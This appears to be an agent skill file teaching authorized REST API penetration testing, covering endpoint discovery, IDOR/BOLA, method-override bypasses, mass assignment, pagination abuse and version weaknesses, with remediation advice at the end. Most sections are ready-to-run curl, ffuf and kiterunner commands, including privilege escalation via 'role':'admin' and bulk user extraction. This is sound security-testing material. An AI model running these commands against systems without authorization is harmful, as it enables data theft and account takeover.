---
name: rest-api-vulns
description: Methodically enumerate and exploit REST API vulnerabilities covering BOLA and broken object-level authorization mass endpoint discovery HTTP method abuse REST misconfigurations and API versioning weaknesses using OpenAPI specs Burp and FFUF.
---

# REST API Vulnerability Enumeration & Exploitation

## When to use this skill

Use this skill during authorized web application assessments when the target exposes a REST API (JSON over HTTP), when an OpenAPI/Swagger spec is available or discoverable, or when a mobile app / SPA consumes an API backend. It maps to the OWASP API Security Top 10 for REST: BOLA (API1), authz deltas across versions (API2), excessive data exposure (API3), missing rate limiting (API4), broken function-level authz (API5), mass assignment (API6), and inventory/version mismanagement (API9). Confirm written authorization before testing; examples assume an in-scope target and a low-privilege test account you control.

## Methodology

### 1. API Surface Discovery and Endpoint Enumeration

Build a complete inventory before touching any business logic. Probe documentation and spec locations, fuzz version prefixes, and mine client-side JavaScript bundles for hidden routes — SPAs and mobile apps routinely ship full route tables to the client. Tooling: ffuf for directory/version fuzzing, kiterunner for known API-route wordlists, and a linkfinder-style grep over JS bundles for `/api/...` literals.

```bash
# Probe common spec/doc locations
for p in swagger.json openapi.json api-docs v3/api-docs swagger/v1/swagger.json swagger-ui.html openapi.yaml .well-known/openapi; do
  curl -s -o /dev/null -w "%{http_code} %{size_download}\thttps://target/$p\n" "https://target/$p"
done
# Version prefix enumeration with ffuf (responds differ per version)
ffuf -u https://target/api/vFUZZ/users -w versions.txt -H "Authorization: Bearer $TOKEN" -mc 200,403 -ac
# Extract API routes from JS bundles (linkfinder-style)
curl -s https://target/static/app.js | grep -oE '"/api/[a-zA-Z0-9_/.{}-]+"|"/v[0-9]+/[a-zA-Z0-9_/-]+"' | tr -d '"' | sort -u
npx -y linkfinder -i https://target/static/app.js -o cli 2>/dev/null
# kiterunner brute force against known route shapes
kr scan https://target/api -A apiroutes-210328.kite -w 100
```

### 2. BOLA / IDOR Across Object Identifiers

Take one object your account legitimately owns and swap its identifier in the path with another user's while keeping *your* low-privilege token. Predictable identifiers (sequential ints, usernames, short hashes) fall immediately; for opaque IDs, harvest them from public endpoints, response linking, or JS bundles, then replay. Run candidate-ID testing in parallel and record request/response pairs — a `200` with another tenant's payload is the finding, not the status code alone. Burp with Autorize/ Authz-style extensions automates the "replay as second identity, diff the body" check.

```http
GET /api/v2/users/124 HTTP/1.1          # user A's token, user B's object
Host: target
Authorization: Bearer <TOKEN_A>
---
HTTP/1.1 200 OK
{"id":124,"email":"admin@corp.tld","role":"admin","ssn":"***-**-1234"}
```

```bash
# Sequential ID probing with user A's token (parallel, low volume, authorized scope)
seq 100 160 | xargs -P 10 -I{} curl -s -o /dev/null -w "%{http_code} {}\n" \
  -H "Authorization: Bearer $TOKEN_A" https://target/api/v2/users/{}
# Hash-based ID probing: probe digests of predictable seeds; also test md5/sha1 of username/email
for u in admin root test demo; do h=$(printf %s $u | md5sum | cut -d' ' -f1); \
  curl -s -o /dev/null -w "%{http_code} $u\n" -H "Authorization: Bearer $TOKEN_A" https://target/api/v2/users/$h; done
# Opaque-ID pivot: pull a foreign object reference from a permitted endpoint, then dereference it
id=$(curl -s -H "Authorization: Bearer $TOKEN_A" https://target/api/v2/users/me | jq -r '.org_id')
curl -s -H "Authorization: Bearer $TOKEN_A" https://target/api/v2/orgs/$id/settings | jq .
```

### 3. Broken Object Property-Level Authorization and Excessive Data Exposure

Even when object access is enforced, field-level filtering often is not: serializers leak `password_hash`, MFA secrets, internal notes, or admin-only flags to low-privilege viewers. Diff the privileged view of an object against your own low-priv view of the same object to enumerate hidden fields, then attempt to force the serializer to render them via `fields`/`expand`/`include` parameters, unusual `Accept` types, or verbose error paths. Treat every undocumented field in a response as a lead.

```bash
# Key-set diff: what does the admin response contain that mine doesn't (leak candidates)
diff <(curl -s -H "Authorization: Bearer $TOKEN_ADMIN" https://target/api/v2/users/124 | jq -S 'keys') \
     <(curl -s -H "Authorization: Bearer $TOKEN_A"     https://target/api/v2/users/124 | jq -S 'keys')
# Request forced field rendering of private properties
curl -s -H "Authorization: Bearer $TOKEN_A" "https://target/api/v2/users/124?fields=password_hash,internal_notes,is_staff" | jq .
# Relationship expansion pulling sensitive nested data cross-user
curl -s -H "Authorization: Bearer $TOKEN_A" "https://target/api/v2/users/124/orders?expand=payment.card_number" | jq .
```

### 4. HTTP Method Abuse and REST Misconfiguration

Build a method matrix per endpoint: read routes that silently accept `PUT`/`DELETE`/`PATCH`, `OPTIONS` responses that enumerate internal capabilities, and endpoints reachable only through override headers (`X-HTTP-Method-Override`, `X-Method-Override`, `X-Original-URL`, `X-Rewrite-URL`). Override headers are a classic router/WAF bypass — the front block filters `DELETE` while the backend honors the override and executes it.

```bash
# Method matrix on a single read endpoint
for m in GET POST PUT DELETE PATCH HEAD OPTIONS TRACE CONNECT; do printf "%-8s %s\n" "$m" \
  "$(curl -s -o /dev/null -w '%{http_code}' -X $m -H "Authorization: Bearer $TOKEN_A" https://target/api/v2/users/124)"; done
# Method-override bypass of a blocked verb
curl -s -X POST -H "X-HTTP-Method-Override: DELETE" -H "Authorization: Bearer $TOKEN_A" https://target/api/v2/users/124
curl -s -X POST -H "X-HTTP-Method-Override: PUT"   -H "Authorization: Bearer $TOKEN_A" \
  -H "Content-Type: application/json" -d '{"role":"admin"}' https://target/api/v2/users/124
# Path/URL override routing to an internal surface; TRACE for header reflection
curl -s -X TRACE --path-as-is -H "X-Original-URL: /api/v1/internal/debug" https://target/api/v2/health
# Content-Type confusion: send form-encoded where JSON is expected to slip past schema validation
curl -s -X POST https://target/api/v2/users/124/delete --data 'id=124'
```

### 5. Mass Assignment, Pagination Abuse, and Rate-Limit Testing

Cross-reference every writable field visible in responses (and every field documented in the OpenAPI schema) against the update endpoints your role is allowed to call: adding `role`, `is_admin`, `org_id`, or `status` to a `PATCH` body often elevates silently. Pair this with throttling tests — establish the rate-limit ceiling, then check whether pagination/`limit` parameters are capped server-side, since `limit=1000000` on an unthrottled endpoint is mass extraction in one request.

```bash
# Mass assignment: mirror response fields into the request body
curl -s -X PATCH -H "Authorization: Bearer $TOKEN_A" -H "Content-Type: application/json" \
  -d '{"email":"a@t.t","is_admin":true,"role":"admin","status":"active"}' https://target/api/v2/users/me | jq '.role,.is_admin'
# Throttle baseline: measure where 429s start and whether tokens/IPs share quota
for i in $(seq 1 200); do curl -s -o /dev/null -w "%{http_code}\n" \
  -H "Authorization: Bearer $TOKEN_A" https://target/api/v2/users/me & done | sort | uniq -c
# Pagination / limit abuse for mass extraction
curl -s -H "Authorization: Bearer $TOKEN_A" "https://target/api/v2/users?limit=1000000" | jq length
curl -s -H "Authorization: Bearer $TOKEN_A" "https://target/api/v2/users?page=1&page_size=9999&include_deleted=true" | jq '.[].email'
# If v3 throttles but v1 does not, harvest through the old version
curl -s -H "Authorization: Bearer $TOKEN_A" "https://target/api/v1/users?limit=1000000" | jq length
```

### 6. Versioning Differences and OpenAPI Spec vs Enforcement Validation

Every live version must be tested as a separate surface: `/v1` frequently survives after `/v3` ships with weaker authz, no rate limiting, and removed fields still populated. Download each version's OpenAPI document, diff the path sets and `securitySchemes`, then replay every documented operation with your low-privilege token and compare *documented* `security` requirements against what is *actually enforced* — undocumented shadow endpoints (`/api/v1`, staging) count double.

```bash
# Pull every spec revision and diff operations and security schemes
for v in v1 v2 v3; do curl -s "https://target/api/$v/openapi.json" -o spec-$v.json; done
diff <(jq -r '.paths|keys[]' spec-v1.json) <(jq -r '.paths|keys[]' spec-v3.json)
jq -r '.components.securitySchemes|keys[]' spec-v1.json
# Cross-version probe: deprecated endpoint with modern token
curl -s -o /dev/null -w "v1 %{http_code}\n" -H "Authorization: Bearer $TOKEN_A" https://target/api/v1/admin/users/124
curl -s -o /dev/null -w "v3 %{http_code}\n" -H "Authorization: Bearer $TOKEN_A" https://target/api/v3/admin/users/124
# Automated spec-vs-live authz replay: hit every documented op with the low-priv token
while read -r m p; do curl -s -o /dev/null -w "%{http_code} $m $p\n" -X "$m" \
  -H "Authorization: Bearer $TOKEN_A" "https://target/api/v3$p"; done \
  < <(jq -r '.paths|to_entries[]|.key as $p|.value|keys[]|"\(.) \($p)"' spec-v3.json)
```

### Remediation

- **Object-level authz middleware**: enforce per-request subject/object ownership checks in a single centralized layer (deny by default), never in individual handlers; cover every path parameter, not just `/users/{id}`.
- **Property-level authz**: server-side response schemas per role with allow-listed fields; strip sensitive properties at the serializer, and ignore client-supplied field selection unless explicitly modeled.
- **Mass assignment defense**: strict request schema validation with deny-listed internal fields (`role`, `is_admin`, `org_id`), or allow-listed writable properties per role; reject unknown keys.
- **Method hygiene**: disable `TRACE` and OPTIONS leaks in production, enforce a per-route method allow-list at the router, strip `X-HTTP-Method-Override` and URL-rewrite headers at the edge.
- **Version lifecycle**: deprecate old versions on a published timeline and actually shut them off; apply identical authz and rate-limit policies across all live versions through shared policy middleware; monitor for shadow/staging deployments.
- **Rate limiting**: per-token *and* per-account quotas server-side, ignoring client-forwarded spoofable headers; cap `limit`/`page_size` server-side regardless of client input; paginate deep listings with keyed cursors.
- **Spec-as-contract**: CI-validate that each documented operation enforces its declared `security` scheme and that live responses match documented schemas; fail builds on drift between the OpenAPI spec and gateway policy.
- **Identifier hardening**: prefer non-sequential opaque IDs with scoped authorization, but treat them as routing hints only — never as the authorization mechanism.
